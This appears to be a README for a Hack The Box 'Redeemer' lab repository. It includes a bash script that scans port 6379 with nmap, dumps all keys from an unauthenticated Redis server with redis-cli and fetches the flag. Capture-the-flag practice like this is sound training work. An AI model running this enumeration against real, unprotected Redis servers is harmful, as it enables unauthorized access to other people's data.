# HTB “Redeemer” Redis Exploit

**Description**  
Exploit a misconfigured Redis server on Hack The Box’s “Redeemer” box to retrieve the flag.

## Quick Start

```
git clone https://github.com/keyfive5/obsidiansignal-htb-redeemer.git
cd obsidiansignal-htb-redeemer
bash scripts/enum-redis.sh 10.129.136.194
```


## Contents
- [Write‑Up](writeup/lab-writeup.md)
- [Screenshots](screenshots/)
- [Automation Script](scripts/enum-smb.sh)

## Results

**scripts/enum-redis.sh**  
```
#!/usr/bin/env bash
# Usage: ./enum-redis.sh <TARGET_IP>

TARGET=$1

echo "[*] Nmap scan for Redis..."
nmap -p 6379 -sV $TARGET -oN nmap-6379.txt

echo "[*] Enumerating Redis info..."
redis-cli -h $TARGET info | tee screenshots/redis-info.txt

echo "[*] Dumping keys..."
redis-cli -h $TARGET --raw keys '*' | tee screenshots/keys.txt

echo "[*] Retrieving flag..."
FLAG=$(redis-cli -h $TARGET get flag)
echo "[*] Flag: $FLAG"
```
